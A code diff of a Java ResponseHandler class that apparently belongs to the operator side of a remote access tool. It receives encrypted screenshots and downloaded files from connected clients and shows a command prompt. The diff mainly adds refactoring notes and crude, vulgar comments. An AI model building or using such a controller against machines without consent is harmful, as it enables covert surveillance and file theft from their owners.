@@ -17,6 +17,8 @@ public class ResponseHandler implements Runnable {
 	private final FileSaver fileSaver;
 	private final byte[] encryptionKey;
 
+	//This class should probably be refactored and do a bit less
+	//ToDo -- Refactor the class by creating a plugin manager for the server side, basically do the same thing as you did with the client
 	public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket, byte[] encryptionKey, byte[] nonce) {
 		this.dataIn = dataIn;
 		this.dataOut = dataOut;
@@ -31,26 +33,26 @@ public class ResponseHandler implements Runnable {
 	public void run() {
 		try {
 			while (true) {
-				int length = dataIn.readInt();
+				int length = dataIn.readInt(); //Get the packet length
 				if (length <= 12) {
-					System.err.println("[ERROR] Invalid packet length: " + length);
+					System.err.println("[ERROR] Invalid packet length: " + length); //Fuck your packet length
 					break;
 				}
-				byte[] receivedNonce = new byte[12];
-				dataIn.readFully(receivedNonce);
+				byte[] receivedNonce = new byte[12]; //Stupid hat
+				dataIn.readFully(receivedNonce); //I just searched it up, I was thinking of dunce, nonce is a pedofile, I was wayyyyyy off
 
 				byte[] encryptedData = new byte[length - 12];
-				dataIn.readFully(encryptedData);
+				dataIn.readFully(encryptedData); //Read the data
 
-				byte[] decryptedData = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedData);
-				String response = new String(decryptedData);
+				byte[] decryptedData = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedData); //Decrypt the data
+				String response = new String(decryptedData); //Get the response from the decrypted data
 
-				if (response.equalsIgnoreCase("screenshot")) {
+				if (response.equalsIgnoreCase("screenshot")) { //I should really make these plugin based like the client, that's the best way to refactor this class, I'll do that later
 					handleScreenshot();
-				} else if (response.equalsIgnoreCase("file download")) {
+				} else if (response.equalsIgnoreCase("file download")) { //Same thing as the above comment
 					handleFileDownload();
 				} else {
-					processCommand(response);
+					processResponse(response); //Normal responses
 				}
 			}
 		} catch (IOException e) {
@@ -67,7 +69,7 @@ public class ResponseHandler implements Runnable {
 		}
 	}
 
-	private void handleScreenshot() {
+	private void handleScreenshot() { //Refactor
     try {
         int length = dataIn.readInt();
         if (length <= 12) {
@@ -92,7 +94,7 @@ public class ResponseHandler implements Runnable {
 }
 
 
-	private void handleFileDownload() {
+	private void handleFileDownload() { //Refactor
 		try {
 			String fileName = dataIn.readUTF();
 			int nonceLength = dataIn.readInt();
@@ -121,12 +123,12 @@ public class ResponseHandler implements Runnable {
 		}
 	}
 
-	private void processCommand(String response) {
+	private void processResponse(String response) { //Normal thing
 		String[] lines = response.split("\\R");
 		for (String line : lines) {
 			System.out.println(line);
 		}
-		System.out.print("[-] Command> ");
+		System.out.print("[-] Command> "); //I'm dumb and couldn't figure this out, so I put it here
 	}
 
 	private void closeResources() {
